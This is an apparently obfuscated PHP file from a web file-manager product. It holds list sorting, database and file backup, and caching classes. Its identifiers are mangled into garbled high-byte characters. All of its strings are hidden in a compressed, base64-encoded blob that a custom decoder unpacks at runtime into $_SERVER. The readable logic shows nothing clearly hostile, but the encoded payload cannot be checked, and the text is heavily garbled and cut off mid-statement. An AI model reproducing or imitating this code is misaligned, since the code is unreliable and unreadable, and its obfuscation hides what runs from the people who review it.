$˜Ö‰ìúí[$ééıÀ¬[42]]; } $ °Ê¨áí = $this->getAutoName($ °Ê¨áí); $Æıƒ‚‚­ = array($ééıÀ¬[1811] => USER_ID, $ééıÀ¬[577] => 0, $ééıÀ¬[513] => $ °Ê¨áí, $ééıÀ¬[514] => $§íÀè³â, $ééıÀ¬[515] => $Îò¶¹ö÷, $ééıÀ¬[2024] => $ò×Šéò + 1); return $this->add($Æıƒ‚‚­); } protected function remove($Ò«éä) { $üöÂØÖ½ =& $_SERVER[‰‰Ş‚€]; $èÇ„Õ¸Á = array($üöÂØÖ½[1811] => USER_ID, $üöÂØÖ½[512] => $Ò«éä); return $this->where($èÇ„Õ¸Á)->delete(); } protected function removeByName($ÃÙ¦ÄÂÇ) { $”–ÁÖíŸ =& $_SERVER[‰‰Ş‚€]; $öÓØóæ = array($”–ÁÖíŸ[1811] => USER_ID, $”–ÁÖíŸ[513] => $ÃÙ¦ÄÂÇ, $”–ÁÖíŸ[577] => 0); return $this->where($öÓØóæ)->delete(); } protected function rename($Ì„ô¯«Ö, $Ä•ò‚‘£) { $¦ôÕ —œ =& $_SERVER[‰‰Ş‚€]; if ($Ì„ô¯«Ö == $Ä•ò‚‘£) { return !1; } $ëê»—Ô = $this->getAutoName($Ä•ò‚‘£); if ($Ä•ò‚‘£ != $ëê»—Ô) { return !1; } $ŒµŞÏ¸š = array($¦ôÕ —œ[1811] => USER_ID, $¦ôÕ —œ[577] => 0, $¦ôÕ —œ[42] => $Ì„ô¯«Ö); return $this->where($ŒµŞÏ¸š)->save(array($¦ôÕ —œ[42] => $Ä•ò‚‘£)); } protected function resetSort($‰øŠ“Ì) { $Î¢™šñ— =& $_SERVER[‰‰Ş‚€]; $‰øŠ“Ì = is_array($‰øŠ“Ì) ? $‰øŠ“Ì : array(); $›ã£†æÛ = array($Î¢™šñ—[1811] => USER_ID); for ($¢¤Ï«´š = 0; $¢¤Ï«´š < count($‰øŠ“Ì); $¢¤Ï«´š++) { $›ã£†æÛ[$Î¢™šñ—[512]] = $‰øŠ“Ì[$¢¤Ï«´š]; $this->where($›ã£†æÛ)->save(array($Î¢™šñ—[2024] => $¢¤Ï«´š + 1)); } return !0; } protected function moveTop($ï×òÀ«ƒ) { $–­ä€¢î =& $_SERVER[‰‰Ş‚€]; $Îş‹¬Ş = array($–­ä€¢î[1811] => USER_ID, $–­ä€¢î[577] => 0); $ğÎåêáÎ = $this->where($Îş‹¬Ş)->where(array($–­ä€¢î[42] => $ï×òÀ«ƒ))->find(); if (!$ğÎåêáÎ) { return; } $æëÌ³ß“ = $this->field($–­ä€¢î[491])->where($Îş‹¬Ş)->order($–­ä€¢î[2526])->select(); $æëÌ³ß“ = array_to_keyvalue($æëÌ³ß“, $–­ä€¢î[22], $–­ä€¢î[491]); $ğçšôß¨ = $æëÌ³ß“; $æëÌ³ß“ = array_remove_value($æëÌ³ß“, $ğÎåêáÎ[$–­ä€¢î[491]]); array_unshift($æëÌ³ß“, $ğÎåêáÎ[$–­ä€¢î[491]]); return $this->resetSort($æëÌ³ß“); } protected function moveBottom($¯…¼Ö„¡) { $à²‚â¦  =& $_SERVER[‰‰Ş‚€]; $ÈóÆ¸Ò¾ = array($à²‚â¦ [1811] => USER_ID, $à²‚â¦ [577] => 0); $©®‹ƒÆÁ = $this->where($ÈóÆ¸Ò¾)->max($à²‚â¦ [2044]); $çŒ¶Ì†Ÿ = array($à²‚â¦ [2044] => $©®‹ƒÆÁ + 1); return $this->where($ÈóÆ¸Ò¾)->where(array($à²‚â¦ [42] => $¯…¼Ö„¡))->save($çŒ¶Ì†Ÿ); } private function getAutoName($”‰—‚ë¨) { $ø¢´“ŞÒ =& $_SERVER[‰‰Ş‚€]; $ôÁ¥ = array($ø¢´“ŞÒ[1811] => USER_ID, $ø¢´“ŞÒ[577] => 0); $ñ’¥™ÊÖ = $this->field($ø¢´“ŞÒ[42])->where($ôÁ¥)->select(); $ñ’¥™ÊÖ = array_to_keyvalue($ñ’¥™ÊÖ, $ø¢´“ŞÒ[22], $ø¢´“ŞÒ[42]); if (!$ñ’¥™ÊÖ || !in_array($”‰—‚ë¨, $ñ’¥™ÊÖ)) { return $”‰—‚ë¨; } for ($üö»õË’ = 0; $üö»õË’ < count($ñ’¥™ÊÖ); $üö»õË’++) { if (!in_array($”‰—‚ë¨ . "\x28{$üö»õË’}\x29", $ñ’¥™ÊÖ)) { return $”‰—‚ë¨ . "\x28{$üö»õË’}\51"; } } return $”‰—‚ë¨ . "\50{$üö»õË’}\51"; } } goto CŸ¿— ç”; f’îÏ½©Ìê: class BackupDbFile { public function __construct() { } public function index() { $£ïªûô³ =& $_SERVER[‰‰Ş‚€]; $º°ßÂÆô = Backup::get(); $“Èù¯Û = $º°ßÂÆô[$£ïªûô³[42]]; $Š™±¡½ = $this->tmpFilesPath() . "\x62\141\x63\153\165\x70\x5f{$“Èù¯Û}\57"; $–¦ö§®Ï = $this->backupPath($º°ßÂÆô); if (!($–¦ö§®Ï = IO::mkdir($–¦ö§®Ï))) { Backup::log($£ïªûô³[899] . $–¦ö§®Ï); return !1; } $ÆìÙæŒÔ = IO::listPath($Š™±¡½); $ùàò‹Şã = isset($ÆìÙæŒÔ[$£ïªûô³[96]]) ? $ÆìÙæŒÔ[$£ïªûô³[96]] : array(); $ı¿ç€¥ó = array_sum(array_column($ùàò‹Şã, $£ïªûô³[89])); if (!$ı¿ç€¥ó) { Backup::log($£ïªûô³[900] . $Š™±¡½); return !1; } $œ²ı‰ì = array($£ïªûô³[901] => $ı¿ç€¥ó, $£ïªûô³[902] => time()); Backup::set($œ²ı‰ì); $±Å’ç” = new TaskFileTransfer($£ïªûô³[903], $£ïªûô³[876], count($ùàò‹Şã), LNG($£ïªûô³[885]) . $£ïªûô³[481] . LNG($£ïªûô³[887]) . $£ïªûô³[904]); $±Å’ç”->task[$£ïªûô³[860]] = $ı¿ç€¥ó; foreach ($ÆìÙæŒÔ[$£ïªûô³[96]] as $›ÓÌûÌÎ) { $Ğ€è½œé = IO::move($›ÓÌûÌÎ[$£ïªûô³[97]], $–¦ö§®Ï); if (!$Ğ€è½œé) { $±Å’ç”->end(); $ö«üÂè³ = IO::getLastError($£ïªûô³[905] . $›ÓÌûÌÎ[$£ïªûô³[97]] . $£ïªûô³[906] . $–¦ö§®Ï . $£ïªûô³[186]); Backup::log($ö«üÂè³); return !1; } } $­¥´´ïñ = new DbManage(); $Ö—ÕıŠÂ = $­¥´´ïñ->getSqlFile(); if (!$Ö—ÕıŠÂ || !$Ö—ÕıŠÂ[$£ïªûô³[907]] || !$Ö—ÕıŠÂ[$£ïªûô³[23]]) { Backup::log($£ïªûô³[908]); return !1; } IO::move($Ö—ÕıŠÂ[$£ïªûô³[907]], $–¦ö§®Ï); IO::move($Ö—ÕıŠÂ[$£ïªûô³[23]], $–¦ö§®Ï); $±Å’ç”->end(); $œ²ı‰ì = array($£ïªûô³[909] => $ı¿ç€¥ó, $£ïªûô³[910] => time()); Backup::set($œ²ı‰ì); return !0; } private function backupPath($äê³¶†ë) { $Ä·†í²Ã =& $_SERVER[‰‰Ş‚€]; $ÆŸ‹ö½ = $äê³¶†ë[$Ä·†í²Ã[42]]; $İş¿ÈÄª = Model($Ä·†í²Ã[869])->get($Ä·†í²Ã[870]); $’­ºşåÕ = substr(md5($Ä·†í²Ã[871] . $İş¿ÈÄª . $ÆŸ‹ö½), 0, 8); return "\173\x69\x6f\72{$äê³¶†ë[$Ä·†í²Ã[848]]}\175\x2f\144\x61\164\141\142\141\x73\145\x2f\x62\x61\143\153\165\160\x2f" . $ÆŸ‹ö½ . $Ä·†í²Ã[21] . $’­ºşåÕ; } private function tmpFilesPath() { $ÏîŞç†ı =& $_SERVER[‰‰Ş‚€]; $²şüˆî‘ = TEMP_FILES; if ($GLOBALS[$ÏîŞç†ı[16]][$ÏîŞç†ı[102]][$ÏîŞç†ı[897]]) { $²şüˆî‘ = $GLOBALS[$ÏîŞç†ı[16]][$ÏîŞç†ı[102]][$ÏîŞç†ı[897]]; if (!mk_dir($²şüˆî‘) || !is_writable($²şüˆî‘) || !IO::mkfile($²şüˆî‘ . $ÏîŞç†ı[898])) { $²şüˆî‘ = TEMP_FILES; } } return $²şüˆî‘; } } class BackupFile { public function __construct() { } public function index() { $­·°·¾„ = Backup::get(); $¤­ö­µç = $­·°·¾„[$_SERVER[‰‰Ş‚€][852]][$_SERVER[‰‰Ş‚€][241]][$_SERVER[‰‰Ş‚€][561]]; $Ñöö®Ø× = array($_SERVER[‰‰Ş‚€][562] => array($_SERVER[‰‰Ş‚€][911], $¤­ö­µç), $_SERVER[‰‰Ş‚€][912] => array($_SERVER[‰‰Ş‚€][415], $­·°·¾„[$_SERVER[‰‰Ş‚€][848]])); $š¼ÀœÌí = (int) Model($_SERVER[‰‰Ş‚€][890])->where($Ñöö®Ø×)->count($_SERVER[‰‰Ş‚€][561]); $İ¸¨Ã»ô = (int) Model($_SERVER[‰‰Ş‚€][890])->where($Ñöö®Ø×)->sum($_SERVER[‰‰Ş‚€][89]); $öãˆíÙ‚ = new TaskFileTransfer($_SERVER[‰‰Ş‚€][913], $_SERVER[‰‰Ş‚€][876], $š¼ÀœÌí, LNG($_SERVER[‰‰Ş‚€][885]) . $_SERVER[‰‰Ş‚€][886] . LNG($_SERVER[‰‰Ş‚€][914])); $öãˆíÙ‚->task[$_SERVER[‰‰Ş‚€][860]] = $İ¸¨Ã»ô; $ñ÷ëŒÇ = array($_SERVER[‰‰Ş‚€][915] => $š¼ÀœÌí, $_SERVER[‰‰Ş‚€][916] => $İ¸¨Ã»ô, $_SERVER[‰‰Ş‚€][917] => time()); Backup::set($ñ÷ëŒÇ); $’ôÓ©´ = !0; $Ç´ò²á£ = $this->storeIds(); $şÉñ¼ = 1; $³”Ã¦Ç‹ = 1000; $ÒË—Ø¡ş = $ëóùçÃ‰ = 0; $şİ—ßÔ’ = array(); $Ë™½¾í = $í•–İú = 0; do { $˜ìë‘Èˆ = $_SERVER[‰‰Ş‚€][918]; $º£ö¯öö = Model($_SERVER[‰‰Ş‚€][890])->where($Ñöö®Ø×)->field($˜ìë‘Èˆ)->order($_SERVER[‰‰Ş‚€][919])->selectPage($³”Ã¦Ç‹, $şÉñ¼); $ÎªÅü£ø = !empty($º£ö¯öö[$_SERVER[‰‰Ş‚€][454]]) ? $º£ö¯öö[$_SERVER[‰‰Ş‚€][454]] : array(); foreach ($ÎªÅü£ø as $¨˜‘«¬®) { if (!$this->_fileExist($¨˜‘«¬®, $şİ—ßÔ’, $Ç´ò²á£)) { Backup::log($_SERVER[‰‰Ş‚€][920] . $¨˜‘«¬®[$_SERVER[‰‰Ş‚€][561]] . $_SERVER[‰‰Ş‚€][921] . $¨˜‘«¬®[$_SERVER[‰‰Ş‚€][97]]); continue; } $Ç¼ññ¡í = $¨˜‘«¬®[$_SERVER[‰‰Ş‚€][97]]; $ÇÈ’­€í = "\x7b\x69\157\x3a{$­·°·¾„[$_SERVER[‰‰Ş‚€][848]]}\175" . substr($Ç¼ññ¡í, strlen("\x7b\151\157\x3a{$¨˜‘«¬®[$_SERVER[‰‰Ş‚€][922]]}\x7d")); if (IO::exist($ÇÈ’­€í)) { $öãˆíÙ‚->updateFileEnd($¨˜‘«¬®[$_SERVER[‰‰Ş‚€][42]], $¨˜‘«¬®[$_SERVER[‰‰Ş‚€][89]]); } else { $ÇÈ’­€í = get_path_father($ÇÈ’­€í); IO::mkdir($ÇÈ’­€í); if (!IO::copy($Ç¼ññ¡í, $ÇÈ’­€í, $_SERVER[‰‰Ş‚€][923])) { Backup::log($_SERVER[‰‰Ş‚€][924] . $Ç¼ññ¡í . $_SERVER[‰‰Ş‚€][906] . $ÇÈ’­€í . $_SERVER[‰‰Ş‚€][186]); $’ôÓ©´ = !1; break; } } $¤­ö­µç = $¨˜‘«¬®[$_SERVER[‰‰Ş‚€][561]]; $ëóùçÃ‰ += 1; $ÒË—Ø¡ş += $¨˜‘«¬®[$_SERVER[‰‰Ş‚€][89]]; $í•–İú += 1; $Ë™½¾í += $¨˜‘«¬®[$_SERVER[‰‰Ş‚€][89]]; if ($ÒË—Ø¡ş >= 1024 * 1024 * 100) { $ñ÷ëŒÇ = array($_SERVER[‰‰Ş‚€][847] => $¤­ö­µç, $_SERVER[‰‰Ş‚€][925] => $í•–İú, $_SERVER[‰‰Ş‚€][926] => $Ë™½¾í); Backup::set($ñ÷ëŒÇ); $ÒË—Ø¡ş = $ëóùçÃ‰ = 0; } } $ÄÃ½šÕ = count($ÎªÅü£ø); $şÉñ¼++; } while ($ÄÃ½šÕ == $³”Ã¦Ç‹); $öãˆíÙ‚->end(); $ñ÷ëŒÇ = array($_SERVER[‰‰Ş‚€][927] => 1, $_SERVER[‰‰Ş‚€][858] => time(), $_SERVER[‰‰Ş‚€][874] => 1, $_SERVER[‰‰Ş‚€][847] => $¤­ö­µç, $_SERVER[‰‰Ş‚€][928] => time()); if ($ëóùçÃ‰) { $ñ÷ëŒÇ[$_SERVER[‰‰Ş‚€][925]] = $í•–İú; $ñ÷ëŒÇ[$_SERVER[‰‰Ş‚€][926]] = $Ë™½¾í; } Backup::set($ñ÷ëŒÇ); return !0; } private function _fileExist($ôÍ´Â’ç, &$éİ´›¹¾, $ÕëµÀõ¯) { $¼Ç¯‚ =& $_SERVER[‰‰Ş‚€]; $´¶³ = $ôÍ´Â’ç[$¼Ç¯‚[97]]; if (in_array($ôÍ´Â’ç[$¼Ç¯‚[561]], $éİ´›¹¾)) { return !1; } if (!in_array($ôÍ´Â’ç[$¼Ç¯‚[922]], $ÕëµÀõ¯)) { return !1; } if (IO::exist($´¶³)) { return !0; } $›¡—¡¸ˆ = get_path_father($´¶³); if (IO::exist($›¡—¡¸ˆ)) { $éİ´›¹¾[] = $ôÍ´Â’ç[$¼Ç¯‚[561]]; return !1; } $äÊÃË™ = array($¼Ç¯‚[922] => $ôÍ´Â’ç[$¼Ç¯‚[922]], $¼Ç¯‚[97] => array($¼Ç¯‚[478], "{$›¡—¡¸ˆ}\x25")); $ò«Ê’²˜ = Model($¼Ç¯‚[890])->where($äÊÃË™)->field($¼Ç¯‚[562])->select(); $éİ´›¹¾ = array_merge($éİ´›¹¾, array_to_keyvalue($ò«Ê’²˜, $¼Ç¯‚[22], $¼Ç¯‚[561])); return !1; } private function _fileFilter($ÇœúíÔ™) { $Ğî±à® =& $_SERVER[‰‰Ş‚€]; return; if (empty($ÇœúíÔ™)) { return; } $é–ğÜŸË = array($Ğî±à®[561] => array($Ğî±à®[17], array_unique($ÇœúíÔ™))); $ıßÃâ•µ = Model($Ğî±à®[929])->where($é–ğÜŸË)->field($Ğî±à®[202])->select(); foreach ($ıßÃâ•µ as $çÄşôÆĞ) { Model($Ğî±à®[929])->remove($çÄşôÆĞ[$Ğî±à®[202]], !1); } } private function storeIds() { $°Şš¦š€ =& $_SERVER[‰‰Ş‚€]; $á·şÍÙ = Model($°Şš¦š€[864])->listData(); $ŒÏÅÃ«´ = array(); $“¨ˆÜÄÒ = $GLOBALS[$°Şš¦š€[16]][$°Şš¦š€[102]][$°Şš¦š€[930]]; foreach ($á·şÍÙ as $î İï¼è) { $Ş¬ê¿Öì = strtolower($î İï¼è[$°Şš¦š€[106]]); if (!isset($“¨ˆÜÄÒ[$Ş¬ê¿Öì])) { continue; } $®ß—ùñ = $°Şš¦š€[87] . (isset($“¨ˆÜÄÒ[$Ş¬ê¿Öì]) ? $“¨ˆÜÄÒ[$Ş¬ê¿Öì] : ucfirst($Ş¬ê¿Öì)); if (!class_exists($®ß—ùñ)) { continue; } $ŒÏÅÃ«´[] = $î İï¼è[$°Şš¦š€[491]]; } return $ŒÏÅÃ«´; } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $İï¨Şò· =& $_SERVER[‰‰Ş‚€]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $ºÚ¯ºÖ‘ = $GLOBALS[$İï¨Şò·[16]][$İï¨Şò·[433]]; $Æ¨ÕõËİ = $ºÚ¯ºÖ‘[$ºÚ¯ºÖ‘[$İï¨Şò·[931]]]; $¬›ı³¤ó = $ºÚ¯ºÖ‘[$İï¨Şò·[932]]; switch ($ºÚ¯ºÖ‘[$İï¨Şò·[931]]) { case $İï¨Şò·[31]: self::$handle = Model($İï¨Şò·[933]); break; case $İï¨Şò·[934]: self::$handle = new CacheRedis($Æ¨ÕõËİ, $¬›ı³¤ó); break; case $İï¨Şò·[935]: self::$handle = new CacheMemcached($Æ¨ÕõËİ, $¬›ı³¤ó); break; case $İï¨Şò·[241]: self::$handle = new CacheFile($Æ¨ÕõËİ, $¬›ı³¤ó); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ı¶óÑ) { if (is_array($ı¶óÑ) || is_object($ı¶óÑ)) { $ı¶óÑ = json_encode($ı¶óÑ); } $ı¶óÑ = rawurlencode($ı¶óÑ); return md5(KOD_SITE_ID . $_SERVER[‰‰Ş‚€][21] . $ı¶óÑ); } public static function get($¨®Íç¬ş, $†¯Ñœ¦¸ = false) { $†–ïæÂ– = self::key($¨®Íç¬ş); $š±£·È» = self::init(); if ($†¯Ñœ¦¸) { return unserialize($š±£·È»->get($†–ïæÂ–)); } if (!isset(self::$memoryCache[$†–ïæÂ–])) { $º¸ÑÇ–Ï = $š±£·È»->get($†–ïæÂ–); self::$memoryCache[$†–ïæÂ–] = unserialize($º¸ÑÇ–Ï); } return self::$memoryCache[$†–ïæÂ–]; } public static function set($®Ç½¬ññ, $·†›Ú÷¬, $Å•…Şª = false) { $¦ìÁâî¶ =& $_SERVER[‰‰Ş‚€]; $¢éÒØ… = self::key($®Ç½¬ññ); if (isset(self::$memoryCache[$¢éÒØ…]) && self::$memoryCache[$¢éÒØ…] === $·†›Ú÷¬) { return !0; } if ($Å•…Şª === 0) { self::$memoryCache[$¢éÒØ…] = $·†›Ú÷¬; return !0; } $¡ú¥ã = self::init(); $¤Ë¤‹Ùµ = serialize($·†›Ú÷¬); CacheLock::lock($®Ç½¬ññ . $¦ìÁâî¶[936]); $”¤òï = $¡ú¥ã->set($¢éÒØ…, $¤Ë¤‹Ùµ, $Å•…Şª); self::$memoryCache[$¢éÒØ…] = $·†›Ú÷¬; CacheLock::unlock($®Ç½¬ññ . $¦ìÁâî¶[936]); return $”¤òï; } public static function getCall($Ï×ó³Êº, $‰‚¤³¼, $œÊÀÚ€õ, $ùĞ«¬±ë = array()) { $Ò¢ú­èú =& $_SERVER[‰‰Ş‚€]; $™†´Èò = self::get($Ï×ó³Êº); if ($™†´Èò || $™†´Èò === $Ò¢ú­èú[22]) { return $™†´Èò; } $™†´Èò = call_user_func_array($œÊÀÚ€õ, $ùĞ«¬±ë); $™†´Èò = $™†´Èò ? $™†´Èò : $Ò¢ú­èú[22]; self::set($Ï×ó³Êº, $™†´Èò, $‰‚¤³¼); return $™†´Èò; } public static function limitCall($ „»·ƒ, $»ºÄˆô = 15, $Ù‚ö´Àò = 30, $‚ê²œ§ = true) { $¤ÁÙïà‰ =& $_SERVER[‰‰Ş‚€]; static $õí®æË = array(); if ($‚ê²œ§) { $ „»·ƒ = $ „»·ƒ . $¤ÁÙïà‰[937] . KodUser::id() . $¤ÁÙïà‰[938] . get_client_ip(); } if (isset($õí®æË[$ „»·ƒ]) && is_array($õí®æË[$ „»·ƒ])) { return $õí®æË[$ „»·ƒ][$¤ÁÙïà‰[342]] <= $Ù‚ö´Àò; } $Šëî¯Ó = self::get($ „»·ƒ); if (!is_array($Šëî¯Ó) || time() - $Šëî¯Ó[$¤ÁÙïà‰[215]] > $»ºÄˆô) { $Šëî¯Ó = array($¤ÁÙïà‰[215] => time(), $¤ÁÙïà‰[342] => 0); } $Šëî¯Ó[$¤ÁÙïà‰[342]]++; self::set($ „»·ƒ, $Šëî¯Ó, $»ºÄˆô); $õí®æË[$ „»·ƒ] = $Šëî¯Ó; return $Šëî¯Ó[$¤ÁÙïà‰[342]] <= $Ù‚ö´Àò; } public static function limitRuntime($‹’ğ­¿©, $Üì¨íòÒ) { $¯÷ãù‚ğ = $_SERVER[‰‰Ş‚€][939] . $‹’ğ­¿©; if (isset(self::$runTimeCache[$¯÷ãù‚ğ]) || !$Üì¨íòÒ) { return !0; } $¢´˜Ìûï = intval(self::get($¯÷ãù‚ğ)); $¢´˜Ìûï = !$¢´˜Ìûï || $¢´˜Ìûï <= 0 ? 1 : $¢´˜Ìûï + 1; if ($¢´˜Ìûï > $Üì¨íòÒ) { return !1; } self::$runTimeCache[$¯÷ãù‚ğ] = !0; self::set($¯÷ãù‚ğ, $¢´˜Ìûï, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $è˜Ÿä¶ => $¶ƒ’¾•Û) { $±ãÁìÃ² = intval(self::get($è˜Ÿä¶)); $±ãÁìÃ² = !$±ãÁìÃ² || $±ãÁìÃ² <= 1 ? 0 : $±ãÁìÃ² - 1; self::set($è˜Ÿä¶, $±ãÁìÃ², 3600); } self::$runTimeCache = array(); } public static function remove($ªµ¨›ë) { $­¯öâÁ’ = self::key($ªµ¨›ë); unset(self::$memoryCache[$­¯öâÁ’]); self::clearTimeout(); CacheLock::lock($ªµ¨›ë); $Ç…ÊòÕ‘ = self::init()->remove($­¯öâÁ’); CacheLock::unlock($ªµ¨›ë); return $Ç…ÊòÕ‘; } public static function removeMemory($¾ãÖ»ÈÍ) { $à˜¾Æ¤ = self::key($¾ãÖ»ÈÍ); unset(self::$memoryCache[$à˜¾Æ¤]); } public static function clearMemory($óçù’ä­ = false) { if ($óçù’ä­) { $óçù’ä­ = self::key($óçù’ä­); unset(self::$memoryCache[$óçù’ä­]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[‰‰Ş‚€][940])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[‰‰Ş‚€][941])) { self::init()->clearTimeout(); } } } goto Eò“²Ûùˆ–; BÕ®¥Û²³: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\x8d\x89\x89\xde\x82\x80", strrev('ŸâÜ‘')); $_SERVER[‰‰Ş‚€] = explode(base64_decode('fAJ8AXwE'), gzinflate(substr(base64_decode('H4sIAAAAAAAAE8W9B3xb1fU4TimU0ULgC2W0hT5Mgkc0bCdxEidOIstyLCJbRpKzbPPyJD1Z').base64_decode('L5b0FL0nLxL2Tgih7NWWVaCUJOwREkrLbimjdFCgrNhJyir8CgU6+N9x7niSDN//5/f/fP6B')."\x44\xf7\x9e\x3b\xde\x1d\xe7\x9e\x7b\xee\xb9\xe7\x9c\x7b\xef\xfd\xd7\x5e\xfb\xc0\xf5\x6b\xf7\x5e\xfb\x8d\xb5\xfb\xfc\xea\xbc\xb3\xb7\x5d\xf6\x12\xd\xa3\x7f\xbf\x49\xfe\x45\xe1\x1f\xae\xdf\x7f\x2f\xf2\xe7\xb0\xf5\x17"."\xd6\xd4\x74\x34\x1d\x38\xbd\xeb\x3b\x17\xdf\x7b\xa7\xf6\x73\x6d\xb3\x76\x41\x38\xf4\x9b\xdf\x6\xf\xfa\xdd\x2f\x4e\xc\x4c\xdc\xf4\x9b\xd1\x89\x6f\xec\xf5\xe2\x33\x9f\x3e\xdc\x8c\x32\xd3\xb2\xaa\x96\x32\x32\x3a\xd"."\xe3\x90\x65\x8c\xe9\x72\x4a\x14\xc5\x83\x39\x91\xae\xe\xe8\xb6\x9a\x30\x73\xb6\x9e\xb3\x2d\xa\x6e\xf5\x45\x83\x7e\xb5\xdb\x17\xeb\xa0\x71\x2d\x9f\xf7\x5a\xc9\x41\xcb\xab\x15\x12\x69\x63\x48\xf\x19\x71\x6f\xdc\xc8".base64_decode('eZOarXlQgOY6kP7MpD+JtJ4YVLW4WbD1JAUVcxkjN0jDzfRHyZm2oo8YFvs0akjKGKBhVrGX')."\376\364\104\102\5\75\153\332\320\33\17\164\212\217\36\372\327\132\223\61\130\272\332\25\216\251\321\236\356\356\100\44\6\231\232\345\364\254\231\204\120\136\53\150\131\370\176\136\57\130\250\65\162\165"."\152\336\314\353\71\7\104\0\360\20\304\65\13\152\152\153\125\333\2\335\241\360\12\65\266\242\73\0\71\342\352\232\242\136\30\245\61\22\214\332\132\301\216\31\131\235\347\30\56\360\166\265\6\26".base64_decode('B7uUWMTXFfX5Y8FwFwX7w52dwVg5PBIOhVp9/iXlKd0R3+JOn4LahybZyKXMGmUVTVml1NJA')."\xbb\xa1\x67\x60\x72\x72\x1a\x6b\x8e\x3d\x9a\x87\x50\x8c\x87\xd0\x34\xe5\x8a\x99\xc\x8d\x74\xf1\x50\x52\x4f\x69\xc5\xc\x8c\x56\x9b\x1c\xc9\x17\x8c\xac\xc6\x3a\xbd\x44\x1f\xe5\x50\xc0\xa8\xa2\x6d\x1a\xb9\x4\x8d\x4".base64_decode('RuyCJuCorQk00QgdKSwaCAX8MQU3UGmPhDsVmISsZtl6QVnWEYgEFNzolmrS12oF8KULDYXi').strrev('4{{p‘“Ä;Ğ€Ğ‰55-¤Íª9šÍ™„¡ŠÖ”Di,¨TËCUlõ°jÉ”…')."\300\143\320\271\223\102\250\45\63\0\77\35\261\144\52\143\253\103\132\246\310\320\24\226\116\65\374\300\257\151\1\352\256\61\162\106\21\320\24\252\60\115\276\254\40\120\144\271\165\6\321\223\20\310"."\xa2\xf2\x26\x94\x8b\x3\x2c\xce\x72\xad\x66\x1\x3\xad\xd0\x21\x1a\x6c\x59\x40\x7f\xe7\x41\xf9\x38\x26\x23\x43\x7a\xc1\x56\xf5\x5c\xc2\x4c\x1a\x39\x58\xc7\xb\x1\x1f\x35\x3b\xdd\x56\x40\xe4\xa3\x0\xc4\xc7\xcc\x24".base64_decode('WVgQKUySuopZOQuPIuKTSRb03NfnpNEQX8k4r4jlUUs4ETBSo2Ip4nzdPNUyi4UEIpYpGJYG').base64_decode('AOu2jTrHBsTsyWdMLRnVC7xrhtmOKgoXbRk4yFZBUhoEb03vGe7/9vcuQv/UAqHrg8+k9UxG').base64_decode('1Ud0WCbZ5CyL9c9rYfqLIDQaDKtpzUp3JmeppBSjn0l9xJNP52EN82Xb50BjPBpdph2QqHDG')."\114\150\220\267\110\72\107\303\151\333\316\107\365\134\262\235\157\60\111\163\70\107\72\237\327\31\225\157\163\51\111\245\123\131\241\164\64\33\315\26\53\230\315\360\20\353\35\207\131\34\150\217\260\31"."\x4a\xa6\x0\x1\xd9\x26\x50\x5\x1f\x34\x2c\x42\xcf\xc4\x62\x44\x9b\x53\xc6\x48\x68\xb6\x61\xe6\xbc\x66\xc2\xd6\x6d\xb7\x65\x17\x74\xd\x6a\xf4\x25\x12\xba\x65\xb9\xfd\x68\x7f\x2b\x98\x19\xb7\x2f\x93\x31\x87\xdd\xe1".base64_decode('gjFg5JqVOiCtdPNzY3LXDOuyap6CcQF/pq6laKfcc9h647kLWs5K6QV3AJC9WUGN5TSPZWsz').strrev('d¬ĞÎCœ	`k'."\0".'G¾JÍjÈAwwtJ¢óËÔÇxò+å¾¨…é"ZÛfŠÍy¸i¼¬')."\xb5\x11\xb7\x36\xc0\x6a\xa\x8c\xe4\x8d\x82\x6e\xb1\x5e\x2b\x8b\x3b\x63\x80\x51\x29\x77\x27\x5e\x1b\x86\x9e\x74\x47\x11\x41\x86\xca\x66\xd4\xcf\x54\x10\xae\x28\x2c\x8d\x42\x3b\x62\xb1\x6e\x35\xd8\x8e\x76\xdc\xae\x80"."\xda\xe9\x8b\xf9\x81\x6f\x8\xd8\xda\x0\xab\x3a\x84\xc8\x2c\xaf\x92\x1\x97\xbb\xd1\x1a\xc1\xd8\xd4\x85\x3a\x27\x80\xdd\xe6\xb0\x5e\x40\x1f\x6e\x1d\x6d\x56\x6\xcd\x64\xdc\x1c\xf1\xb0\xa4\x76\xe0\x60\x58\x66\x3c\xbf"."\x79\xdb\x1d\xd1\x72\x3\xb8\x1b\xf1\x51\x5b\xb7\x4a\xc9\x4d\x2b\xda\x9f\x3d\x29\xba\x20\x3d\x71\x3d\x65\x16\xa0\x37\xd6\xd0\x80\x73\xf0\x43\x7a\x6e\xc0\x4e\xb3\xba\xa3\x81\xc8\xd2\x40\x44\x8d\x86\xdb\x63\xcb\x7c\x11"."\330\316\163\10\163\106\130\153\360\327\63\356\210\236\104\203\230\260\131\71\55\57\106\177\271\33\57\30\374\161\226\212\27\21\113\13\5\27\343\261\153\163\133\50\223\133\316\305\352\16\31\131\3\167"."\317\346\51\144\260\321\136\277\30\32\344\45\175\156\351\263\352\152\372\222\323\153\335\350\337\272\332\336\276\66\117\135\377\102\257\41\312\170\33\74\15\112\143\175\223\322\215\230\17\103\313\50\320\351".strrev('¦4@¤àHÀ¡y’’Ñ\'öñtb¿Æ‹}‹‹Ìp‰¢îˆk¡İİ-2D!aq^œÌç†Xs‰xJõ